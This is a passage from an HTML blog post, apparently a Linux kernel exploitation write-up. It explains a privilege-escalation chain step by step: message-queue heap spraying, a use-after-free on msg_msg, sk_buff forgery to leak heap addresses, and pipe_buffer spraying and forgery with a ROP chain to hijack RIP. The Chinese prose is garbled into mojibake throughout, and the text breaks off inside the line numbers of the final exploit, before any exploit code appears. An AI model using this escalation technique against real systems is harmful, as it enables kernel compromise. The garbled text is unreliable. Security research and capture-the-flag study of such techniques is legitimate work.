¸åŒå‘é“¾è¡¨ç»“æ„ä½“ï¼Œæˆ‘ä»¬æ‰€èƒ½è¦†å†™çš„ä¸ºå…¶ next æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€å¤šä¸ªæ¶ˆæ¯æ—¶ï¼Œä¼šå½¢æˆå¦‚ä¸‹ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€å¼€å§‹æ—¶å…ˆåˆ›å»ºå¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶åˆ†åˆ«åœ¨æ¯ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œå½¢æˆå¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼Œè¿™é‡Œä¸ºäº†ä¾¿åˆ©åç»­åˆ©ç”¨ï¼Œç¬¬ä¸€æ¡æ¶ˆæ¯ï¼ˆä¸»æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 0x1000ï¼Œç¬¬äºŒæ¡æ¶ˆæ¯ï¼ˆè¾…åŠ©æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 0x400ï¼š</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>ä¹‹åæˆ‘ä»¬è¯»å‡ºå…¶ä¸­å‡ ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„ä¸»æ¶ˆæ¯ï¼Œå†åˆ©ç”¨ setsockopt è·å–åˆ°æˆ‘ä»¬åˆšé‡Šæ”¾çš„ <code>msg_msg</code> ç»“æ„ä½“çš„ç©ºé—´</p><p><img src="https://s2.loli.net/2022/03/31/cJjVS59m8nvI4e2.png" alt="image.png"></p><p>è¿™æ ·å°±ä¼šå¯¼è‡´ <code>xt_table_info</code> ç»“æ„ä½“è¦†å†™åˆ°å…¶ç›¸é‚»çš„ä¸»æ¶ˆæ¯çš„ next æŒ‡é’ˆï¼Œä»è€Œå¯¼è‡´<strong>åœ¨ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå­˜åœ¨ä¸¤ä¸ªä¸»æ¶ˆæ¯æŒ‡å‘åŒä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯</strong></p><p><img src="https://s2.loli.net/2022/03/31/vOMedQBuFsiKlYD.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ä¸»ä»æ¶ˆæ¯ä¸­æ”¾ç½®å¯¹åº”çš„å€¼æ¥æ ‡è¯†å–·å°„çš„ä¸åŒçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œéå†è¯»å–æ‰€æœ‰é˜Ÿåˆ—æ¥æ„ŸçŸ¥æŒ‡å‘äº†åŒä¸€è¾…åŠ©æ¶ˆæ¯çš„ä¸¤ä¸ªé˜Ÿåˆ—</p><blockquote><p>åˆ©ç”¨ <code>MSG_COPY</code> æ ‡å¿—ä½å¯ä»¥è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸Šçš„æ¶ˆæ¯è€Œä¸é‡Šæ”¾ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-II-é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€ -UAF"><a href="#Step-II-é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€ -UAF" class="headerlink" title="Step.II é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€  UAF"></a>Step.II é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€  UAF</h3><p>æ­¤æ—¶æˆ‘ä»¬å°†è¾…åŠ©æ¶ˆæ¯é‡Šæ”¾æ‰ï¼Œä¾¿èƒ½æˆåŠŸå®Œæˆ UAF çš„æ„å»ºï¼Œæ­¤æ—¶<strong>æˆ‘ä»¬ä»èƒ½é€šè¿‡å…¶ä¸­ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—è®¿é—®åˆ°è¯¥è¾…åŠ©æ¶ˆæ¯å¯¹åº” objectï¼Œä½†å®é™…ä¸Šè¿™ä¸ª object å·²ç»åœ¨ freelist ä¸Šäº†</strong></p><p><img src="https://s2.loli.net/2022/03/31/nbw6aSFXIVEtDN4.png" alt="image.png"></p><h3 id="Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€"><a href="#Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€" class="headerlink" title="Step.III å †å–· sk_buff ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€"></a>Step.III å †å–· <code>sk_buff</code> ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•åˆ©ç”¨è¿™ä¸ª UAFï¼Œå› ä¸ºå…¶ä»ä½äºæ¶ˆæ¯é˜Ÿåˆ—ä¸Šæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“è¿›è¡Œåç»­çš„åˆ©ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰ç”¨å¦å¤–ä¸€ä¸ªå¸¸ç”¨æ¥è¿›è¡Œå †å–·çš„ç»“æ„ä½“â€”â€”<code>sk_buff</code>ï¼Œç±»ä¼¼äº <code>msg_msg</code>ï¼Œå…¶åŒæ ·å¯ä»¥æä¾›è¿‘ä¹ä»»æ„å¤§å°å¯¹è±¡çš„åˆ†é…å†™å…¥ä¸é‡Šæ”¾ï¼Œä½†ä¸åŒçš„æ˜¯ <code>msg_msg</code> ç”±ä¸€ä¸ª header åŠ ä¸Šç”¨æˆ·æ•°æ®ç»„æˆï¼Œè€Œ <code>sk_buff</code> æœ¬èº«ä¸åŒ…å«ä»»ä½•ç”¨æˆ·æ•°æ®ï¼Œ<strong>ç”¨æˆ·æ•°æ®å•ç‹¬å­˜æ”¾åœ¨ä¸€ä¸ª object å½“ä¸­ï¼Œè€Œ sk_buff ä¸­å­˜æ”¾æŒ‡å‘ç”¨æˆ·æ•°æ®çš„æŒ‡é’ˆ</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>è‡³äºè¿™ä¸ªç»“æ„ä½“çš„åˆ†é…ä¸é‡Šæ”¾ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼Œ<strong>sk_buff åœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­ä»£è¡¨ä¸€ä¸ªã€ŒåŒ…ã€ï¼Œ</strong>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€å¯¹ socketï¼Œåœ¨ä¸Šé¢å‘é€ä¸æ¥æ”¶æ•°æ®åŒ…å°±èƒ½å®Œæˆ sk_buff çš„åˆ†é…ä¸é‡Šæ”¾</strong>ï¼Œæœ€ç®€å•çš„åŠæ³•ä¾¿æ˜¯ç”¨ socketpair ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€å¯¹ socketï¼Œä¹‹åå¯¹å…¶ read &amp; write ä¾¿èƒ½å®Œæˆæ”¶å‘åŒ…çš„å·¥ä½œ</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•é€šè¿‡ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“å®Œæˆä¿¡æ¯æ³„éœ²ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥ä¼ªé€ ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ï¼Œå°†å…¶ <code>m_ts</code> åŸŸè®¾ä¸ºä¸€ä¸ªè¾ƒå¤§å€¼ï¼Œ<strong>ä»è€Œè¶Šç•Œè¯»å–åˆ°ç›¸é‚»è¾…åŠ©æ¶ˆæ¯çš„ headerï¼Œæ³„éœ²å‡ºå †ä¸Šåœ°å€</strong></p><p><img src="https://s2.loli.net/2022/03/31/CxE24knZqyXPgHj.png" alt="image.png"></p><p>æˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„æ˜¯å“ªä¸ªåœ°å€ï¼Ÿè®©æˆ‘ä»¬é‡æ–°å°†ç›®å…‰æ”¾å›åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„ç»“æ„ä¸Šï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çŸ¥é“çš„æ˜¯ï¼Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ prev æŒ‡é’ˆæŒ‡å‘å…¶ä¸»æ¶ˆæ¯ï¼Œè€Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ next æŒ‡é’ˆæŒ‡å‘è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„ <code>msg_queue</code> ç»“æ„ï¼Œè¿™æ˜¯ç›®å‰æˆ‘ä»¬å·²çŸ¥çš„ä¸¤ä¸ªâ€œå †ä¸Šåœ°å€â€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼ªé€  <code>msg_msg-&gt;next</code>ï¼Œ<strong>å°†å…¶æŒ‡å‘æˆ‘ä»¬çš„ UAF object ç›¸é‚»çš„è¾…åŠ©æ¶ˆæ¯å¯¹åº”çš„ä¸»æ¶ˆæ¯å¤´éƒ¨å¾€å‰ï¼Œä»è€Œè¯»å‡ºè¯¥ä¸»æ¶ˆæ¯çš„å¤´éƒ¨ï¼Œæ³„éœ²å‡ºå¯¹åº”çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€</strong>ï¼Œæœ‰äº†è¿™ä¸ªè¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå†å‡å» 0x400 <strong>ä¾¿æ˜¯æˆ‘ä»¬çš„ UAF å¯¹è±¡çš„åœ°å€</strong></p><blockquote><p>é€šè¿‡ä¼ªé€  msg_msg-&gt;next å¯ä»¥å®Œæˆä»»æ„åœ°å€è¯»ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€"><a href="#Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€" class="headerlink" title="Step.IV å †å–· pipe_bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€"></a>Step.IV å †å–· <code>pipe_buffer</code>ï¼Œæ³„éœ²å†…æ ¸åŸºå€</h3><p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥äº†å¯æ§åŒºåŸŸçš„åœ°å€ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥è€ƒè™‘æ³„éœ²å†…æ ¸ .text æ®µçš„åŸºå€ï¼Œä»¥åŠå¦‚ä½•åŠ«æŒ RIP å®Œæˆææƒ</p><p>ä¹‹å‰æˆ‘ä»¬ä¸ºä»€ä¹ˆå°†è¾…åŠ©æ¶ˆæ¯çš„å¤§å°è®¾ä¸º 0x400ï¼Ÿé™¤äº†æ–¹ä¾¿å¯¹é½ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€å±‚è€ƒè™‘å°±æ˜¯è¿™ä¸ªå¤§å°åˆšå¥½æœ‰ä¸€ä¸ªååˆ†å®ç”¨çš„ç»“æ„ä½“ <code>pipe_buffer</code> æ•°ç»„ï¼Œ<strong>æ—¢èƒ½å¸®æˆ‘ä»¬æ³„éœ²å†…æ ¸ä»£ç æ®µåŸºå€ï¼Œä¹Ÿèƒ½å¸®æˆ‘ä»¬åŠ«æŒ RIP</strong></p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>pipe_buffer</code> ä¸­å­˜åœ¨ä¸€ä¸ªå‡½æ•°è¡¨æˆå‘˜ <code>pipe_buf_operations</code> ï¼Œå…¶æŒ‡å‘å†…æ ¸ä¸­çš„å‡½æ•°è¡¨ <code>anon_pipe_buf_ops</code>ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿå°†å…¶è¯»å‡ºï¼Œä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸åŸºå€ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ <code>sk_buff</code> ä¿®å¤è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥ object é‡å› slub ä¸­ï¼Œä½† <code>sk_buff</code> ä»æŒ‡å‘è¯¥ object</li><li>å–·å°„ <code>pipe_buffer</code>ï¼Œä¹‹åå†æ¥æ”¶ <code>sk_buff</code> æ•°æ®åŒ…ï¼Œ<strong>æˆ‘ä»¬ä¾¿èƒ½è¯»å‡º pipe_buffer ä¸Šæ•°æ®ï¼Œæ³„éœ²å†…æ ¸åŸºå€</strong></li></ul><h3 id="Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ"><a href="#Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ" class="headerlink" title="Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ"></a>Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ</h3><p>å½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œè€Œ UAF object çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ sk_buff åœ¨ UAF object ä¸Šä¼ªé€ å‡½æ•°è¡¨ä¸æ„é€  ROP chainï¼Œå†é€‰ä¸€æ¡è¶³å¤Ÿåˆé€‚çš„ gadget å®Œæˆæ ˆè¿ç§»ä¾¿èƒ½åŠ«æŒ RIP å®Œæˆææƒ</strong></p><p><img src="https://s2.loli.net/2022/03/31/RW6HFoLJf1AE5kd.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span 